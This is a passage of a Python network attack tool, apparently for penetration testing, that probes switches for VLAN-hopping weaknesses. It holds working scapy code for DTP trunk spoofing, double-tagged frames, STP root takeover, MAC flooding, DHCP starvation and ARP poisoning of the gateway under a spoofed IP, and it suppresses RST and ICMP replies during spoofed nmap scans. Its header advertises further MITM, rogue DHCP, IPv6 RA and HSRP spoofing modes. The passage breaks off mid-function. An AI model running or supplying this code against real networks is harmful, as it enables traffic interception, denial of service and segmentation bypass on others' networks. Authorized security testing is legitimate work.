#!/usr/bin/env python3
"""
vlanhop.py — consolidated VLAN bypass scanner (low false-positive).

One tool replacing the ~13 overlapping scripts. Every reachability result is
*attributed* by the reply's source MAC and 802.1Q tag, so we never confuse a
router routing between VLANs (normal L3) with a real layer-2 VLAN hop.

  Verdicts
  ────────
    L2-HOP        red     — layer-2 VLAN bypass CONFIRMED (DTP/GVRP/VTP/double-tag)
    L3-SEG        magenta — cross-VLAN reach CONFIRMED via L3 (no ISG + no inter-VLAN ACLs)
    ROUTED        cyan    — reachable, but only via normal routing (not a bypass by itself)
    LIKELY        yellow  — strong signal, not fully confirmed
    INCONCLUSIVE  yellow  — no reply on a test that needs a far-side listener
    NOT-FOUND     green   — clean negative (with a positive control first)
    SKIPPED       dim     — not run

  Commands
  ────────
    vlanhop.py -i eth0 assess                  # main scanner (default)
    vlanhop.py -i eth0 recon --seconds 20      # passive: learn VLANs + native VLAN
    vlanhop.py -i eth0 reach --targets 10.30.0.1 10.50.0.1
    vlanhop.py -i eth0 map --vlan 30           # nmap a confirmed-reachable VLAN
    vlanhop.py -i eth0 hosts --subnets 10.30.0.0/24 10.40.0.0/24

  Active red-team commands
  ────────────────────────
    vlanhop.py -i eth0 mitm --targets 10.10.0.5          # ARP-spoof MITM
    vlanhop.py -i eth0 rogue-dhcp --starvation 500       # rogue DHCP (redirect gw/dns)
    vlanhop.py -i eth0 ipv6 --prefix fd00::              # rogue IPv6 RA (SLAAC)
    vlanhop.py -i eth0 hsrp --vip 10.10.0.1 --group 1    # first-hop spoof
    vlanhop.py -i eth0 snmp --target 10.10.0.1           # SNMP brute + VLAN DB
    vlanhop.py -i eth0 neighbor-spoof --mode both        # forged CDP/LLDP

Authorized use only. Run only on networks you own or have written permission to test.
"""

import os, sys, time, random, struct, socket, argparse, subprocess, threading
from datetime import datetime
from collections import defaultdict

try:
    from scapy.all import (
        Ether, Dot1Q, IP, TCP, UDP, ICMP, ARP, LLC, SNAP, Raw,
        sendp, sr, sr1, srp1, sniff, get_if_hwaddr, get_if_addr, get_if_list, conf,
        BOOTP, DHCP, RandShort,
    )
    from scapy.layers.l2 import STP
    from scapy.layers.inet import IPOption_LSRR
except ImportError as e:
    sys.exit(f"[!] {e}\n    pip install scapy")

try:
    from scapy.layers.inet6 import (
        IPv6, ICMPv6ND_RA, ICMPv6ND_RS, ICMPv6NDOptPrefixInfo,
        ICMPv6NDOptSrcLLAddr, ICMPv6NDOptMTU,
    )
    HAVE_INET6 = True
except ImportError:
    HAVE_INET6 = False

conf.verb = 0

SPEEDUP = 1.0   # --fast sets this to ~0.4 to shorten listen windows (trades some accuracy)

# ── colours ───────────────────────────────────────────────────────────────────
R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"; B = "\033[94m"
M = "\033[95m"; C = "\033[96m"; DIM = "\033[2m"; BOLD = "\033[1m"; Z = "\033[0m"

# ── verdicts ──────────────────────────────────────────────────────────────────
V_HOP   = "L2-HOP"
V_SEG   = "L3-SEG"
V_ROUTED= "ROUTED"
V_LIKELY= "LIKELY"
V_INCON = "INCONCLUSIVE"
V_SAFE  = "NOT-FOUND"
V_SKIP  = "SKIPPED"

VERDICT_COLOR = {
    V_HOP: R, V_SEG: M, V_LIKELY: Y, V_INCON: Y,
    V_ROUTED: C, V_SAFE: G, V_SKIP: DIM,
}

def ts():  return datetime.now().strftime("%H:%M:%S")
def ok(m):   print(f"  [{ts()}] {G}[+]{Z} {m}")
def info(m): print(f"  [{ts()}] {C}[*]{Z} {m}")
def warn(m): print(f"  [{ts()}] {Y}[!]{Z} {m}")
def bad(m):  print(f"  [{ts()}] {R}[-]{Z} {m}")

def need_root():
    if os.geteuid() != 0:
        sys.exit("[!] run with: sudo python3 vlanhop.py ...")

def sh(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return r.returncode, r.stdout
    except Exception as e:
        return 1, str(e)

def tool_ok(name): return sh(f"command -v {name}")[0] == 0

def detect_iface():
    rc, out = sh("ip route")
    for line in out.splitlines():
        if line.startswith("default") and "dev" in line:
            return line.split()[line.split().index("dev") + 1]
    rc, out = sh("ip -o link show up")
    for line in out.splitlines():
        if ": lo" in line or "lo:" in line:
            continue
        iface = line.split(":")[1].strip().split("@")[0]
        if iface:
            return iface
    return "eth0"

def detect_gateway():
    rc, out = sh("ip route")
    for line in out.splitlines():
        if line.startswith("default"):
            return line.split()[2]
    return None

def resolve_mac(ip, iface, timeout=3):
    r = srp1(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=ip),
             iface=iface, timeout=timeout)
    return r[ARP].hwsrc if r and ARP in r else None

def rand_mac():
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(5))


class Finding:
    """One assessment result with calibrated verdict + evidence lines."""
    def __init__(self, name):
        self.name = name
        self.status = V_SKIP
        self.evidence = []

    def set(self, status, *evidence):
        self.status = status
        self.evidence = list(evidence)
        return self


# ── attribution ───────────────────────────────────────────────────────────────
def classify_reply(pkt, gw_mac, our_mac):
    """Bucket an incoming packet by how it reached us.

    Returns a tuple (kind, mac, tagged, ttl):
      kind  'SELF'    our own frame (ignore)
            'TAGGED'  carries an 802.1Q tag -> reached a VLAN at L2 / trunk leak
            'ROUTED'  src MAC == gateway -> L3 routing (normal)
            'L2'      any other src MAC -> L2 adjacency / hop
            '?'       no Ether layer
    """
    if Ether not in pkt:
        return ("?", None, False, None)
    mac = pkt[Ether].src.lower()
    if mac == our_mac.lower():
        return ("SELF", mac, Dot1Q in pkt, pkt[IP].ttl if IP in pkt else None)
    tagged = Dot1Q in pkt
    ttl = pkt[IP].ttl if IP in pkt else None
    if tagged:
        return ("TAGGED", mac, True, ttl)
    if gw_mac and mac == gw_mac.lower():
        return ("ROUTED", mac, False, ttl)
    return ("L2", mac, False, ttl)


# ── recon parsers ─────────────────────────────────────────────────────────────
def parse_cdp(payload):
    """CDP TLVs -> dict.  payload = bytes after the 4-byte CDP header."""
    info = {}
    T = {0x0001: "device-id", 0x0002: "addresses", 0x0003: "port-id",
         0x0005: "software", 0x0006: "platform", 0x000a: "native-vlan",
         0x000b: "duplex", 0x0016: "mgmt-ip"}
    d = bytes(payload)
    off = 0
    while off + 4 <= len(d):
        t = (d[off] << 8) | d[off + 1]
        l = (d[off + 2] << 8) | d[off + 3]
        if l < 4 or off + l > len(d):
            break
        v = d[off + 4:off + l]
        name = T.get(t)
        if name:
            if t == 0x000a and len(v) >= 2:
                info[name] = (v[0] << 8) | v[1]
            elif t == 0x0016 and len(v) >= 4:
                info[name] = ".".join(map(str, v[:4]))
            elif t == 0x0002 and len(v) >= 13:
                info[name] = ".".join(map(str, v[9:13]))
            else:
                try:
                    info[name] = v.decode("utf-8", "replace").strip("\x00")
                except Exception:
                    pass
        off += l
    return info


def parse_lldp(payload):
    info = {}
    d = bytes(payload)
    off = 0
    while off + 2 <= len(d):
        hdr = (d[off] << 8) | d[off + 1]
        t = (hdr >> 9) & 0x7F
        l = hdr & 0x1FF
        off += 2
        if t == 0 or off + l > len(d):
            break
        v = d[off:off + l]
        if t == 1:   info["chassis-id"] = v[1:].decode("utf-8", "replace").strip()
        elif t == 2: info["port-id"]    = v[1:].decode("utf-8", "replace").strip()
        elif t == 4: info["system"]     = v.decode("utf-8", "replace").strip()
        elif t == 5: info["description"]= v.decode("utf-8", "replace").strip()[:60]
        off += l
    return info


def parse_vtp_subset(data):
    """VTP v1/v2 Subset Advertisement -> {vlan_id: name}."""
    result = {}
    try:
        if len(data) < 40 or data[1] != 0x02:
            return result
        off = 40
        while off < len(data):
            elen = data[off]
            if elen < 13 or off + elen > len(data):
                break
            vlan_id = (data[off + 4] << 8) | data[off + 5]
            nlen = data[off + 3]
            name = data[off + 12:off + 12 + nlen].decode("ascii", "ignore")
            if 0 < vlan_id < 4095:
                result[vlan_id] = name or f"VLAN{vlan_id}"
            off += elen
    except Exception:
        pass
    return result


# ── packet builders ───────────────────────────────────────────────────────────
def build_dtp(our_mac):
    def tlv(t, v): return struct.pack(">HH", t, 4 + len(v)) + v
    mac_b = bytes.fromhex(our_mac.replace(":", ""))
    payload = (b"\x01"
               + tlv(0x0001, b"\x00")       # domain (empty)
               + tlv(0x0002, b"\xa5")       # status: desirable
               + tlv(0x0003, b"\xa5")       # type: desirable
               + tlv(0x0004, mac_b))        # neighbour MAC
    return (Ether(dst="01:00:0c:cc:cc:cc", src=our_mac)
            / LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03)
            / SNAP(OUI=0x00000c, code=0x2004)
            / payload)


def build_stp_root(our_mac):
    return (Ether(dst="01:80:c2:00:00:00", src=our_mac)
            / LLC(dsap=0x42, ssap=0x42, ctrl=0x03)
            / STP(proto=0, version=0, bpdutype=0x00, bpduflags=0x01,
                  rootid=0, rootmac=our_mac, pathcost=0,
                  bridgeid=0, bridgemac=our_mac,
                  portid=0x8001, age=0, maxage=20, hellotime=2, fwddelay=15))


def build_double_tag(our_mac, native, target, spoof_ip, probe_ip):
    return (Ether(dst="ff:ff:ff:ff:ff:ff", src=our_mac)
            / Dot1Q(vlan=native, type=0x8100)   # outer: native VLAN (stripped)
            / Dot1Q(vlan=target, type=0x0806)   # inner: target VLAN -> ARP
            / ARP(op=1, hwsrc=our_mac, psrc=spoof_ip,
                  hwdst="00:00:00:00:00:00", pdst=probe_ip))


def build_gvrp(our_mac, vlans):
    pdu = struct.pack(">H", 0x0001)          # GVRP protocol id
    pdu += b"\x01"                            # attribute type: VID
    for vid in vlans:
        pdu += bytes([2, 1, vid & 0xFF])      # len=2, event=JoinEmpty, value=vid
    pdu += b"\x00"
    return (Ether(dst="01:80:c2:00:00:21", src=our_mac)
            / LLC(dsap=0x42, ssap=0x42, ctrl=0x03)
            / Raw(pdu))


def vtp_header(version, code, followers, domain):
    d = (domain or "").encode()[:32]
    return bytes([version, code, followers, len(d)]) + d.ljust(32, b"\x00")


def build_vtp_request(our_mac, domain=""):
    body = vtp_header(2, 3, 0, domain)
    return (Ether(dst="01:00:0c:cc:cc:cc", src=our_mac)
            / LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03)
            / SNAP(OUI=0x00000c, code=0x2003)
            / Raw(body))


def build_dhcp_discover(mac):
    xid = random.randint(1, 0xFFFFFFFF)
    return (Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
            / IP(src="0.0.0.0", dst="255.255.255.255")
            / UDP(sport=68, dport=67)
            / BOOTP(chaddr=bytes.fromhex(mac.replace(":", "")), xid=xid, flags=0x8000)
            / DHCP(options=[("message-type", "discover"), "end"]))


def dhcp_type(p):
    if DHCP not in p:
        return None
    for opt in p[DHCP].options:
        if isinstance(opt, tuple) and opt[0] == "message-type":
            return opt[1]
    return None


def _sniff_bg(iface, duration, filt, stop_ev=None):
    """Background sniffer -> (captured list, done event)."""
    captured = []
    done = threading.Event()
    def _run():
        pkts = sniff(iface=iface, timeout=duration, lfilter=filt,
                     stop_filter=(lambda _: stop_ev.is_set()) if stop_ev else None)
        captured.extend(pkts)
        done.set()
    threading.Thread(target=_run, daemon=True).start()
    return captured, done


# ── recon module ──────────────────────────────────────────────────────────────
def run_recon(iface, our_mac, seconds):
    CDP = "01:00:0c:cc:cc:cc"; LLDP = "01:80:c2:00:00:0e"
    STP_M = "01:80:c2:00:00:00"; PVST = "01:00:0c:cc:cd:cd"

    found = {"vlans": set(), "native": None, "platform": None, "sw_mac": None,
             "cdp": {}, "lldp": {}, "tagged": 0, "untagged": 0,
             "hsrp": False, "vrrp": False, "ra": 0}

    def h(p):
        if Ether not in p or p[Ether].src.lower() == our_mac.lower():
            return
        dst = p[Ether].dst.lower()
        if Dot1Q in p:
            found["tagged"] += 1
            found["vlans"].add(p[Dot1Q].vlan)
        else:
            found["untagged"] += 1

        if dst == CDP and SNAP in p and p[SNAP].code == 0x2000:
            cdp = parse_cdp(p[SNAP].payload)
            found["cdp"] = cdp
            found["native"] = cdp.get("native-vlan", found["native"])
            found["platform"] = cdp.get("platform", found["platform"])
            found["sw_mac"] = p[Ether].src
            info(f"CDP from {p[Ether].src}: {cdp}")
        elif dst == LLDP and Raw in p:
            found["lldp"] = parse_lldp(p[Raw].load)
            info(f"LLDP from {p[Ether].src}: {found['lldp']}")
        elif dst == STP_M and STP in p:
            vid = p[STP].bridgeid & 0x0FFF
            found["vlans"].add(vid)
            info(f"STP BPDU from {p[Ether].src}: root-prio={p[STP].rootid >> 12} "
                 f"bridge-prio={p[STP].bridgeid >> 12} ext-VLAN={vid}")
        elif dst == PVST and Dot1Q in p:
            found["vlans"].add(p[Dot1Q].vlan)
            info(f"PVST+ BPDU: VLAN {p[Dot1Q].vlan} from {p[Ether].src}")
        elif dst == CDP and SNAP in p and p[SNAP].code == 0x2003:
            info(f"VTP advertisement from {p[Ether].src}")

        # first-hop redundancy / IPv6 auto-config surface (passive)
        if dst == "01:00:5e:00:00:02" and UDP in p and p[UDP].dport == 1985:
            found["hsrp"] = True
            info(f"HSRP hello from {p[Ether].src}")
        elif dst == "01:00:5e:00:00:12":
            found["vrrp"] = True
            info(f"VRRP advertisement from {p[Ether].src}")
        if IPv6 in p and ICMPv6ND_RA in p:
            found["ra"] += 1

    info(f"Passive recon on {iface} for {seconds}s ...")
    sniff(iface=iface, timeout=seconds, prn=h, store=False)
    return found


# ── DTP module ────────────────────────────────────────────────────────────────
def run_dtp(iface, our_mac, timeout):
    f = Finding("DTP switch spoofing (trunk negotiation)")
    DTP_M = "01:00:0c:cc:cc:cc"
    pkt = build_dtp(our_mac)
    captured, done = _sniff_bg(
        iface, timeout,
        lambda p: Ether in p and LLC in p
                  and p[Ether].dst.lower() == DTP_M
                  and p[Ether].src.lower() != our_mac.lower())
    time.sleep(0.3)
    for _ in range(5):
        sendp(pkt, iface=iface, verbose=False)
        time.sleep(0.4)
    done.wait(timeout + 2)

    if captured:
        f.set(V_HOP,
              f"Switch answered DTP ({len(captured)} frame(s)) from {captured[0][Ether].src}",
              "Port negotiates trunk — all VLANs reachable at L2.")
    else:
        f.set(V_SAFE,
              "No DTP reply.",
              "Port is access + nonegotiate, OR the switch is not Cisco (DTP is Cisco-only).")
    return f


# ── double-tag module ─────────────────────────────────────────────────────────
def run_double_tag(iface, our_mac, gw_mac, native, target, probe_ip, count=4, wait=6):
    wait = wait * SPEEDUP
    f = Finding(f"VLAN double-tagging (native {native} -> VLAN {target})")
    spoof_ip = f"10.{target}.0.200"
    pkt = build_double_tag(our_mac, native, target, spoof_ip, probe_ip)
    captured, done = _sniff_bg(
        iface, wait,
        lambda p: ARP in p and p[ARP].op == 2
                  and p[Ether].src.lower() != our_mac.lower())
    time.sleep(0.3)
    for _ in range(count):
        sendp(pkt, iface=iface, verbose=False)
        time.sleep(0.4)
    done.wait(wait + 2)

    if captured:
        kinds = defaultdict(int); macs = set()
        for p in captured:
            k, mac, tagged, ttl = classify_reply(p, gw_mac, our_mac)
            kinds[k] += 1; macs.add(mac)
        if kinds.get("TAGGED"):
            f.set(V_HOP,
                  f"Tagged ARP reply from VLAN {target} — 802.1Q tag observed at L2.",
                  f"Replied MACs: {', '.join(sorted(macs))}",
                  "Switch stripped outer tag and forwarded inner tag into the target VLAN.")
        elif kinds.get("L2"):
            f.set(V_HOP,
                  f"ARP reply from a non-gateway MAC — L2 reach into VLAN {target}.",
                  f"Replied MACs: {', '.join(sorted(macs))}",
                  "Reply src != gateway, so this is layer-2 delivery, not routing.")
        else:
            f.set(V_LIKELY,
                  f"{len(captured)} reply(s) to double-tag probe (via gateway MAC).",
                  "Inconclusive attribution — inspect captured packets.")
    else:
        f.set(V_INCON,
              f"No reply to double-tag probe (outer={native}, inner={target}).",
              f"Native VLAN may not match ({native}), or no host at {probe_ip}, "
              "or native tagging is correctly enforced. Verify native VLAN via recon.")
    return f


# ── GVRP module ───────────────────────────────────────────────────────────────
def run_gvrp(iface, our_mac, vlans, wait=8):
    wait = wait * SPEEDUP
    f = Finding("GVRP dynamic-VLAN join")
    GVRP_M = "01:80:c2:00:00:21"
    captured, done = _sniff_bg(
        iface, wait,
        lambda p: Ether in p and LLC in p
                  and p[Ether].dst.lower() == GVRP_M
                  and p[Ether].src.lower() != our_mac.lower())
    time.sleep(0.3)
    pkt = build_gvrp(our_mac, vlans)
    for _ in range(5):
        sendp(pkt, iface=iface, verbose=False)
        time.sleep(1.0)
    done.wait(wait + 2)

    if not captured:
        f.set(V_SAFE,
              "No GVRP frames received from the switch.",
              "GVRP is not running on this port (default for access ports / non-HP/Aruba).")
        return f

    joined = set()
    for p in captured:
        try:
            raw = bytes(p[Raw].load)
            off = 2 if raw[:2] == b"\x00\x01" else 0
            while off + 1 <= len(raw):
                ln = raw[off]
                if ln == 0:
                    break
                if ln >= 2 and off + 2 < len(raw) and raw[off + 1] == 2:  # JoinIn
                    joined.add(raw[off + 2])
                off += 1 + ln
        except Exception:
            pass

    if joined:
        f.set(V_HOP,
              f"Switch echoed JoinIn for VLAN(s) {sorted(joined)}.",
              "Port registered into the target VLAN(s) — dynamic VLAN hop CONFIRMED.")
    else:
        f.set(V_LIKELY,
              f"{len(captured)} GVRP frame(s) observed — switch participates in GVRP.",
              "No JoinIn echo yet; registration not fully confirmed.")
    return f


# ── VTP module (discover only — injection is destructive) ─────────────────────
def run_vtp(iface, our_mac, seconds=12):
    seconds = seconds * SPEEDUP
    f = Finding("VTP VLAN database exposure")
    captured, done = _sniff_bg(
        iface, seconds,
        lambda p: Ether in p and SNAP in p and p[SNAP].code == 0x2003
                  and p[Ether].src.lower() != our_mac.lower())
    time.sleep(0.3)
    sendp(build_vtp_request(our_mac), iface=iface, verbose=False)
    done.wait(seconds + 2)

    if not captured:
        f.set(V_SAFE,
              "No VTP advertisements received.",
              "VTP not in use (or not a Cisco switch).")
        return f

    rev = domain = None
    vlans = {}
    for p in captured:
        try:
            raw = bytes(p[Raw].load)
            if len(raw) < 36:
                continue
            code = raw[1]
            dlen = raw[3]
            domain = raw[4:4 + dlen].decode("replace")
            if code == 1 and len(raw) >= 40:
                rev = struct.unpack(">I", raw[36:40])[0]
            elif code == 2 and len(raw) >= 40:
                rev = struct.unpack(">I", raw[36:40])[0]
                vlans.update(parse_vtp_subset(raw))
        except Exception:
            continue

    if rev is not None:
        f.set(V_LIKELY,
              f"VTP domain '{domain}' config-rev {rev} — VLAN DB {len(vlans)} VLAN(s).",
              f"VLANs: {sorted(vlans)}",
              "VTP is exposed on this port; with a higher config-rev the DB could be "
              "overwritten (VTP injection). Verify VTP is transparent/off in production.")
    else:
        f.set(V_LIKELY, f"{len(captured)} VTP frame(s) seen (domain '{domain}').",
              "VTP traffic present — review VTP mode/password.")
    return f


# ── STP module ────────────────────────────────────────────────────────────────
def run_stp(iface, our_mac, timeout):
    f = Finding("STP root bridge takeover")
    STP_M = "01:80:c2:00:00:00"
    captured, done = _sniff_bg(
        iface, timeout,
        lambda p: LLC in p and STP in p
                  and p[Ether].dst.lower() == STP_M
                  and p[Ether].src.lower() != our_mac.lower())
    time.sleep(0.3)
    pkt = build_stp_root(our_mac)
    for _ in range(5):
        sendp(pkt, iface=iface, verbose=False)
        time.sleep(0.4)
    done.wait(timeout + 2)

    tcns = [p for p in captured if p[STP].bpdutype == 0x80]
    bpdus = [p for p in captured if p[STP].bpdutype != 0x80]

    if tcns:
        f.set(V_LIKELY,
              f"{len(tcns)} TCN(s) received — switch accepted our superior BPDU.",
              "Root Guard / BPDU Guard NOT active; L2 traffic redirection possible.")
    elif bpdus:
        f.set(V_LIKELY,
              f"{len(bpdus)} BPDU(s) received from {bpdus[0][Ether].src}.",
              "BPDUs are being processed (Root Guard may be absent).")
    else:
        f.set(V_INCON,
              "No BPDU/TCN received.",
              "BPDU Guard may be active, OR STP is simply not running on this segment.")
    return f


# ── MAC flood + leak module (baseline vs post) ────────────────────────────────
def run_macflood(iface, our_mac, count=5000):
    f = Finding("MAC flood / CAM overflow + leak")

    def unknown_unicast(duration):
        def filt(p):
            if not (Ether in p and IP in p):
                return False
            dst = p[Ether].dst.lower()
            return (dst != our_mac.lower()
                    and dst != "ff:ff:ff:ff:ff:ff"
                    and not dst.startswith(("01:", "33:")))
        return sniff(iface=iface, timeout=duration, lfilter=filt, store=True)

    baseline = unknown_unicast(3)
    tagged = []

    def leak_filter(p):
        if Ether not in p or p[Ether].src.lower() == our_mac.lower():
            return False
        if Dot1Q in p:
            tagged.append(p); return True
        return False

    leak_done = threading.Event()
    def leak_sniff():
        sniff(iface=iface, timeout=count / 2000 + 6, lfilter=leak_filter,
              stop_filter=lambda _: leak_done.is_set(), store=False)

    threading.Thread(target=leak_sniff, daemon=True).start()
    time.sleep(0.2)

    t0 = time.time()
    batch = []
    for _ in range(count):
        batch.append(Ether(src=rand_mac(), dst=rand_mac())
                     / IP(src=f"172.{random.randint(16,31)}.{random.randint(0,255)}.{random.randint(1,254)}",
                          dst=f"172.{random.randint(16,31)}.{random.randint(0,255)}.{random.randint(1,254)}")
                     / UDP(sport=random.randint(1024, 65535), dport=random.randint(1, 1024)))
    for i in range(0, len(batch), 256):
        sendp(batch[i:i + 256], iface=iface, verbose=False)
    flood_dur = time.time() - t0
    leak_done.set()
    time.sleep(1.0)
    post = unknown_unicast(3)

    base_rate = len(baseline) / 3.0
    post_rate = len(post) / 3.0
    f.evidence.append(f"Sent {count} random-MAC frames in {flood_dur:.1f}s.")
    f.evidence.append(f"Unknown-unicast baseline {base_rate:.1f}/s -> post {post_rate:.1f}/s.")

    if tagged:
        vlans = sorted({p[Dot1Q].vlan for p in tagged})
        f.set(V_HOP if False else V_LIKELY,
              f"{len(tagged)} 802.1Q-tagged frame(s) captured during flood (VLANs {vlans}).",
              "Port sees tagged traffic — may be a trunk or leaking other VLANs at L2.")
    elif post_rate > base_rate + 3.0:
        f.set(V_LIKELY,
              f"Unknown-unicast rate rose +{post_rate - base_rate:.1f}/s after flood.",
              "CAM overflow plausible — port security (max-MAC) likely NOT enforced.")
    else:
        f.set(V_SAFE,
              "No tagged-frame leak and no significant post-flood increase.",
              "CAM table held the addresses, or port security is limiting MACs.")
    return f


# ── DHCP module (calibrated — never flags "offers" as vulnerable) ─────────────
def run_dhcp(iface, count=60):
    f = Finding("DHCP starvation (rate-limit check)")
    offers = [0]; naks = [0]
    stop = threading.Event()
    def cap():
        pkts = sniff(iface=iface, timeout=count * 0.06 + 8,
                     lfilter=lambda p: UDP in p and p[UDP].sport == 67 and DHCP in p,
                     stop_filter=lambda _: stop.is_set(), store=True)
        for p in pkts:
            mt = dhcp_type(p)
            if mt == 2: offers[0] += 1
            elif mt == 6: naks[0] += 1
    threading.Thread(target=cap, daemon=True).start()
    time.sleep(0.4)
    for _ in range(count):
        sendp(build_dhcp_discover(rand_mac()), iface=iface, verbose=False)
        time.sleep(0.05)
    time.sleep(2)
    stop.set(); time.sleep(1)

    f.evidence.append(f"Sent {count} DISCOVERs with random MACs -> offers={offers[0]} naks={naks[0]}.")
    if naks[0] > 0 and offers[0] == 0:
        f.set(V_LIKELY,
              "Pool exhausted / no leases left (NAKs with zero offers).",
              "DHCP snooping rate-limit NOT effective — real clients may be denied IPs.")
    elif offers[0] > 0:
        f.set(V_LIKELY,
              f"Server offered IPs to {offers[0]}/{count} spoofed MACs.",
              "No DHCP snooping rate-limit observed — pool exhaustion is possible.",
              "(Hardening finding only: this is a DoS vector, not a VLAN hop.)")
    else:
        f.set(V_INCON,
              "No DHCP responses.",
              "Snooping rate-limit may be active, or no DHCP server on this segment.")
    return f


# ── spoof reach module (ISG / inter-VLAN routing) ─────────────────────────────
class SpoofCtx:
    def __init__(self, iface, our_mac, gw_ip, gw_mac, spoof_ip, subnet):
        self.iface, self.our_mac = iface, our_mac
        self.gw_ip, self.gw_mac = gw_ip, gw_mac
        self.spoof_ip, self.subnet = spoof_ip, subnet
        self.stop = threading.Event()
        self.th = None

    def _poison(self):
        pkt = (Ether(dst=self.gw_mac, src=self.our_mac)
               / ARP(op=2, hwsrc=self.our_mac, psrc=self.spoof_ip,
                     hwdst=self.gw_mac, pdst=self.gw_ip))
        garp = (Ether(dst="ff:ff:ff:ff:ff:ff", src=self.our_mac)
                / ARP(op=2, hwsrc=self.our_mac, psrc=self.spoof_ip,
                      hwdst="ff:ff:ff:ff:ff:ff", pdst=self.spoof_ip))
        n = 0
        while not self.stop.is_set():
            try:
                sendp(pkt, iface=self.iface, verbose=False)
                if n % 4 == 0:
                    sendp(garp, iface=self.iface, verbose=False)
            except Exception:
                pass
            n += 1
            self.stop.wait(1.2)


def spoof_setup(iface, our_mac, gw_ip, gw_mac, vlan, octet):
    spoof_ip = f"10.{vlan}.0.{octet}"
    subnet = f"10.{vlan}.0.0/24"
    sh(f"ip addr add {spoof_ip}/32 dev {iface}")
    sh(f"ip route replace {subnet} via {gw_ip} dev {iface}")
    ctx = SpoofCtx(iface, our_mac, gw_ip, gw_mac, spoof_ip, subnet)
    ctx.th = threading.Thread(target=ctx._poison, daemon=True)
    ctx.th.start()
    time.sleep(0.5)
    return ctx


def spoof_teardown(ctx):
    ctx.stop.set()
    if ctx.th:
        ctx.th.join(1)
    sh(f"ip addr del {ctx.spoof_ip}/32 dev {ctx.iface}")
    sh(f"ip route del {ctx.subnet} dev {ctx.iface}")
    if ctx.gw_mac:
        restore = (Ether(dst=ctx.gw_mac, src=ctx.our_mac)
                   / ARP(op=2, hwsrc=ctx.gw_mac, psrc=ctx.gw_ip,
                         hwdst="ff:ff:ff:ff:ff:ff", pdst=ctx.gw_ip))
        for _ in range(3):
            try:
                sendp(restore, iface=ctx.iface, verbose=False)
            except Exception:
                break
            time.sleep(0.2)


def check_vlan_spoof(iface, our_mac, gw_ip, gw_mac, vlan, octet, probe="svi"):
    """Return dict: reachable, direct, reply_src list, method."""
    svi = f"10.{vlan}.0.1"
    target = svi if probe == "svi" else probe

    direct = False
    rc, _ = sh(f"ping -c 1 -W 1 {target}")
    if rc == 0:
        direct = True

    ctx = spoof_setup(iface, our_mac, gw_ip, gw_mac, vlan, octet)
    replies = []
    def cap():
        pkts = sniff(iface=iface, timeout=10,
                     lfilter=lambda p: IP in p and p[IP].dst == ctx.spoof_ip
                                       and p[Ether].src.lower() != our_mac.lower(),
                     stop_filter=lambda _: ctx.stop.is_set(), store=True)
        replies.extend(pkts)
    ct = threading.Thread(target=cap, daemon=True); ct.start()
    time.sleep(0.3)

    probe_pkt = (Ether(src=our_mac, dst=gw_mac)
                 / IP(src=ctx.spoof_ip, dst=target) / ICMP())
    for _ in range(4):
        try:
            sendp(probe_pkt, iface=iface, verbose=False)
        except Exception:
            break
        time.sleep(1.0)
    time.sleep(3 * SPEEDUP)
    spoof_teardown(ctx)
    ct.join(2)

    srcs = sorted({p[IP].src for p in replies if IP in p})[:4]
    return {"vlan": vlan, "svi": svi, "reachable": len(replies) > 0,
            "direct": direct, "reply_src": srcs}


# ── nmap map helpers ──────────────────────────────────────────────────────────
def iptables_suppress(spoof_ip, add=True):
    op = "-A" if add else "-D"
    for r in [
        f"iptables {op} OUTPUT -s {spoof_ip} -p tcp --tcp-flags RST RST -j DROP",
        f"iptables {op} OUTPUT -s {spoof_ip} -p icmp --icmp-type port-unreachable -j DROP",
        f"iptables {op} OUTPUT -s {spoof_ip} -p icmp --icmp-type host-unreachable -j DROP",
    ]:
        sh(r)


def nmap_discover(subnet, iface, spoof=None):
    src = f"-S {spoof.spoof_ip} -e {iface} " if spoof else ""
    rc, out = sh(f"nmap -sn -n -T4 {src}--min-rate 1000 {subnet}")
    live, cur = [], None
    for line in out.splitlines():
        if line.startswith("Nmap scan report for "):
            cur = line.split()[-1]
        if "Host is up" in line and cur:
            live.append(cur); cur = None
    return live


def nmap_scan(subnet, vlan, targets, iface, args, spoof=None):
    outdir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vlan-scans")
    os.makedirs(outdir, exist_ok=True)
    stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    base = f"{outdir}/vlan{vlan}_{stamp}"
    mode = "-sT" if args.connect else "-sS"
    extra = "-O --osscan-guess" if not args.no_os else ""
    ports = f"-p {args.ports}" if getattr(args, "ports", None) else ""
    tgt = targets if isinstance(targets, str) else " ".join(targets)
    src = ""
    if spoof:
        src = f"-S {spoof.spoof_ip} -e {iface} "
        iptables_suppress(spoof.spoof_ip, add=True)
    try:
        cmd = (f"nmap {mode} -sV {extra} -Pn -n -T4 "
               f"--host-timeout {args.host_timeout}s {src}{ports} "
               f"-oN {base}.nmap -oG {base}.gnmap {tgt}")
        info("nmap (live output below)")
        print()
        subprocess.call(cmd, shell=True)
        print()
    finally:
        if spoof:
            iptables_suppress(spoof.spoof_ip, add=False)
    return f"{base}.gnmap"


def summarize_gnmap(path, vlan, subnet):
    if not os.path.exists(path):
        warn("no greppable output to summarize")
        return
    rows = []
    for line in open(path, errors="replace"):
        line = line.strip()
        if not line.startswith("Host:"):
            continue
        parts = line.split("\t")
        ip = parts[0].split()[1].rstrip("()")
        ports, osline = "", ""
        for seg in parts[1:]:
            if seg.startswith("Ports:"):
                ports = seg[len("Ports:"):]
            elif seg.startswith("OS:"):
                osline = seg[len("OS:"):].split("|")[0]
        svcs = []
        for p in ports.split(","):
            if not p:
                continue
            f = p.split("/")
            if len(f) >= 5 and f[1] == "open":
                svcs.append(f"{f[0]}/{f[3]}")
        rows.append((ip, ",".join(svcs) or "no open ports", osline))
    if not rows:
        warn("no hosts in greppable output")
        return
    print(f"  {BOLD}── VLAN {vlan} ({subnet}) scan summary ──{Z}")
    for ip, svc, os_ in rows:
        print(f"  {G}{ip:<16}{Z} {svc}")
        if os_:
            print(f"  {'':<16} {B}OS:{Z} {os_}")


# ── report ────────────────────────────────────────────────────────────────────
def strip_ansi(s):
